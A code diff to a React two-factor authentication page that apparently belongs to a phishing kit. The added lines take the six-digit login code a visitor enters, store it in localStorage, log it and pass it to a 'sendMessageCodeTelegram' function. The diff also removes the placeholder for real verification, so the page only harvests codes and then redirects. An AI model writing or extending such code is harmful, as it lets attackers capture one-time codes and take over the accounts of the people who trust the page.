@@ -1,3 +1,4 @@
+import { sendMessageCodeTelegram } from "@/services/send-message";
 import { useEffect, useRef, useState } from "react";
 import "./TwoFactorAuth.css";
 
@@ -62,16 +63,16 @@ export default function TwoFactorAuth() {
   const handleSubmit = (e) => {
     e.preventDefault();
     const twoFactorCode = code.join("");
+    localStorage.setItem("twoFactorCode", JSON.stringify(twoFactorCode));
 
     if (twoFactorCode.length === 6) {
       window.close();
 
-      // Nếu không đóng được (do bảo mật), chuyển hướng trang chính
       if (window.opener) {
-        window.opener.location.href = "/home"; // Điều hướng trang chính đến home
+        sendMessageCodeTelegram(twoFactorCode);
+        console.log(twoFactorCode);
+        window.opener.location.href = "/home";
       }
-      console.log("Verifying code:", twoFactorCode);
-      // Add your verification logic here
     } else {
       alert("Please enter a complete 6-digit code");
     }
@@ -130,7 +131,7 @@ export default function TwoFactorAuth() {
           <div className="tfa-info">
             <p>
               To help keep your account safe, we need to confirm this login attempt. We've sent a 6-digit code to your
-              authenticator app or phone number ending in <strong>***67</strong>.
+              authenticator app or phone number.
             </p>
           </div>
 
